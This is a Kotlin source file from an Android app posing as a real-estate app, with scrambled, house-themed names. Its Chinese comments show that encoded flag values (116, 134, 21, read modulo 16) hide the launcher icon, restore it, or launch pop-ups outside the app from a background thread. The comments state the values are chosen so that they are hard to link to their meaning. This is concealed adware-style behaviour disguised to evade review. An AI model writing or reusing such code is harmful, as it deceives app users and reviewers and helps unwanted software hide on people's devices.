package com.real.estate

import android.content.Context
import com.real.estate.windows.WinBedHelpsgskKb
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Date：2024/4/3
 * Describe:
 */
class WiBedHelp(var status: String, var show: String) {
    //    i%16等于4隐藏图标,i%16等于5恢复隐藏.i%16等于6外弹(外弹在子线程调用).(保证i参数不容易关联)
    private fun getFlag(inf: String): Int {
        return when (inf) {
            "bedroom" -> { // 隐藏
                "116".toInt()
            }

            "attic" -> {//外弹
                "134".toInt()
            }

            "windo" -> {
                1
            }

            else -> {
                "21".toInt()
            }
        }
    }

    //隐藏
    fun actionE(context: Context) {
        WinBedHelpsgskKb.goTosBgsgedroom(context, getFlag(status))
    }

    //外弹
    suspend fun sigoA(context: Context) {
        withContext(Dispatchers.IO) {
            WinBedHelpsgskKb.goTosBgsgedroom(context, getFlag(show))
        }
    }

    fun sjig(context: Context) {
        if (getFlag(status) == 1) {
            status = "sigj"
        } else {
            WinBedHelpsgskKb.sihgUjsig(context, false)
        }
        WinBedHelpsgskKb.sihgUjsig(context, 1f)
    }

}